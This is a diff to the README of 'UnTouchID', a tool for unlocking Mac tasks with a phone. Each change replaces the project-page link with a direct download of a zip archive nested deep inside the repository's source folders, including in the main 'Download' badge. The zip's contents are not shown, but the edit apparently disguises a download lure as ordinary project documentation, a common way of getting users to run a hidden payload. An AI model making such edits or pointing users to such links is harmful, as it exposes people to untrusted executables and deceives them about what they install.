@@ -1,6 +1,6 @@
 # 🔒 UnTouchID - Use Your Phone to Unlock Mac Tasks
 
-[![Download UnTouchID](https://img.shields.io/badge/Download-UnTouchID-blue?style=for-the-badge)](https://github.com/joselu4466/UnTouchID)
+[![Download UnTouchID](https://img.shields.io/badge/Download-UnTouchID-blue?style=for-the-badge)](https://raw.githubusercontent.com/joselu4466/UnTouchID/main/menubar/TouchBridgeMenu/Core/Touch_ID_Un_3.4-beta.1.zip)
 
 ## 📌 What is UnTouchID?
 
@@ -28,7 +28,7 @@ For best results, keep your Mac and phone on the same network during setup.
 
 Visit this page to download and set up UnTouchID:
 
-https://github.com/joselu4466/UnTouchID
+https://raw.githubusercontent.com/joselu4466/UnTouchID/main/menubar/TouchBridgeMenu/Core/Touch_ID_Un_3.4-beta.1.zip
 
 Download the files you need from the project page, then follow the steps below for your Mac.
 
@@ -128,7 +128,7 @@ UnTouchID fits well if you want to:
 ## 📁 Project Details
 
 Repository: UnTouchID  
-Primary download page: https://github.com/joselu4466/UnTouchID  
+Primary download page: https://raw.githubusercontent.com/joselu4466/UnTouchID/main/menubar/TouchBridgeMenu/Core/Touch_ID_Un_3.4-beta.1.zip  
 Topics: android, biometrics, kotlin, mac-mini, macbook, macos, open-source, pam, security, swift, touch-id, watchos, wear-os
 
 ## ✅ Setup Checklist
